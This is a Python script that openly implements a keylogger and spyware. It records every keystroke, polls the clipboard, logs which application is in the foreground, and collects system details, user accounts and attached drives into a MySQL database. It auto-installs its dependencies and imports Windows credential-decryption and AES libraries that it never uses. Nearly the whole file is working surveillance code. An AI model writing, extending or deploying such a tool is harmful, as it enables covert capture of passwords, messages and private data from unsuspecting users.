import subprocess
import os
import platform
import time

import mysql.connector
from pynput import keyboard
from datetime import datetime
from threading import Timer
import pyperclip  # This module is used for clipboard operations
import socket
import base64
import json
import psutil
import win32crypt
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta

# Check and install required modules
required_modules = ['pynput', 'mysql-connector-python', 'pyperclip', 'psutil','pycryptodome','pywin32']

for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        subprocess.call([os.sys.executable, "-m", "pip", "install", module])

# Connect to MySQL database
db = mysql.connector.connect(
    host="localhost",
    user="root",
    password="",
    database="main_log"
)

cursor = db.cursor()

# Create the keystrokes table if not exists
create_keystrokes_table_query = """
CREATE TABLE IF NOT EXISTS keystrokes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    time DATETIME NOT NULL,
    key_data VARCHAR(255) NOT NULL
)
"""

# Create the clipboard table if not exists
create_clipboard_table_query = """
CREATE TABLE IF NOT EXISTS clipboard (
    id INT AUTO_INCREMENT PRIMARY KEY,
    time DATETIME NOT NULL,
    data VARCHAR(255) NOT NULL
)
"""

# Create the applications table if not exists
create_applications_table_query = """
CREATE TABLE IF NOT EXISTS applications (
    id INT AUTO_INCREMENT PRIMARY KEY,
    time DATETIME NOT NULL,
    action VARCHAR(50) NOT NULL,
    app_name VARCHAR(255) NOT NULL
)
"""

# Create the system_info table if not exists
create_system_info_table_query = """
CREATE TABLE IF NOT EXISTS system_info (
    id INT AUTO_INCREMENT PRIMARY KEY,
    time DATETIME NOT NULL,
    system_specifications TEXT,
    user_accounts TEXT,
    connected_devices TEXT
)
"""
try:
    cursor.execute(create_keystrokes_table_query)
    cursor.execute(create_clipboard_table_query)
    cursor.execute(create_applications_table_query)
    cursor.execute(create_system_info_table_query)

    db.commit()
except mysql.connector.Error as err:
    print(f"Error during table creation: {err}")
    pass  # Handle any errors that might occur during table creation

# Function to insert data into the appropriate table
def insert_data(data_type, data):
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if data_type == "Keystroke":
            query = "INSERT INTO keystrokes (time, key_data) VALUES (%s, %s)"
        elif data_type == "Clipboard":
            query = "INSERT INTO clipboard (time, data) VALUES (%s, %s)"
        elif data_type == "Application":
            query = "INSERT INTO applications (time, action, app_name) VALUES (%s, %s, %s)"
        elif data_type == "SystemInfo":
            query = "INSERT INTO system_info (time, system_specifications, user_accounts, connected_devices) " \
                    "VALUES (%s, %s, %s, %s)"

        else:
            return

        values = (current_time, *data)
        cursor.execute(query, values)
        db.commit()
        print(f"Data inserted successfully: {data_type} - {data}")
    except mysql.connector.Error as err:
        print(f"Error insert data: {err}")
        with open("error_log.txt", "a") as error_log:
            error_log.write(f"{datetime.now()}: {err}\n")
        pass



# Function to start the keylogger
def start_keylogger():
    def on_press(key):
        try:
            insert_data("Keystroke", (f"{key.char}",))
        except AttributeError:
            insert_data("Keystroke", (f"{key}",))

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Function to monitor clipboard
def monitor_clipboard():
    previous_clipboard_data = ""

    while True:
        clipboard_data = pyperclip.paste()

        if clipboard_data != previous_clipboard_data:
            insert_data("Clipboard", (clipboard_data,))
            previous_clipboard_data = clipboard_data
            time.sleep(1)

# Function to monitor application usage
def monitor_applications():
    active_application = ""

    while True:
        current_application = get_active_application()

        if current_application != active_application:
            if active_application:
                insert_data("Application", ("Closed", active_application))
            if current_application:
                insert_data("Application", ("Opened", current_application))

            active_application = current_application

# Function to gather system information
def gather_system_info():
    system_specifications = get_system_specifications()
    user_accounts = get_user_accounts()
    connected_devices = get_connected_devices()

    insert_data("SystemInfo", (system_specifications, user_accounts, connected_devices))

# Helper function to get system specifications
def get_system_specifications():
    specifications = f"System: {platform.system()} {platform.release()} {platform.architecture()}\n" \
                     f"Processor: {platform.processor()}\n" \
                     f"Machine: {platform.machine()}\n" \
                     f"Node: {platform.node()}\n" \
                     f"System Version: {platform.version()}"
    return specifications

# Helper function to get user accounts
def get_user_accounts():
    accounts = subprocess.run(
        ["net", "user"],
        capture_output=True,
        text=True
    ).stdout.strip()
    return accounts

# Helper function to get connected devices
def get_connected_devices():
    devices = ""
    for partition in psutil.disk_partitions():
        devices += f"Device: {partition.device}, Type: {partition.fstype}\n"
    return devices

# Helper function to get the active application
def get_active_application():
    if platform.system() == "Darwin":
        return subprocess.run(
            ["osascript", "-e", 'tell application "System Events" to get name of first process whose frontmost is true'],
            capture_output=True,
            text=True
        ).stdout.strip()
    elif platform.system() == "Windows":
        return subprocess.run(
            ["powershell", "(Get-Process | Where-Object {$_.MainWindowTitle}).MainWindowTitle"],
            capture_output=True,
            text=True
        ).stdout.strip()
    elif platform.system() == "Linux":
        return subprocess.run(
            ["xdotool", "getactivewindow", "getwindowname"],
            capture_output=True,
            text=True
        ).stdout.strip()
    else:
        return ""





# Set the time interval for keylogger data insertion (in seconds)
interval = 60.0

# Schedule the keylogger to run at the specified interval
keylogger_timer = Timer(interval, start_keylogger)
keylogger_timer.start()

# Start clipboard monitoring
clipboard_thread = Timer(interval, monitor_clipboard)
clipboard_thread.start()

# Start application monitoring
applications_thread = Timer(interval, monitor_applications)
applications_thread.start()


# Gather system information at the beginning
gather_system_info()
# Schedule the system info gathering to run at a longer interval
system_info_timer = Timer(3600.0, gather_system_info)
system_info_timer.start()

